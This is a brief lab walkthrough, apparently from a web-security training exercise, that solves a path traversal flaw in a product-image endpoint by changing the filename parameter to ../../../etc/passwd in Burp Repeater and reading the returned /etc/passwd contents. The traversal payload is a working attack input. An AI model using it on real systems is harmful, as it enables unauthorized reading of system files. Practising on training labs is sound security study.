This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.


![alt text](<Screenshot 2025-05-13 at 22.57.05.png>)



✅ Steps

Open the lab and intercept a request for a product image in Burp Suite:
GET /image?filename=31.jpg

Send the request to Repeater.

In Repeater, modify the filename parameter:
../../../etc/passwd

Final request:
GET /image?filename=../../../etc/passwd
Click Send, and check the Response tab.

If successful, the response will contain:
root:x:0:0:root:/root:/bin/bash

✅ Once /etc/passwd is displayed, the lab is solved.

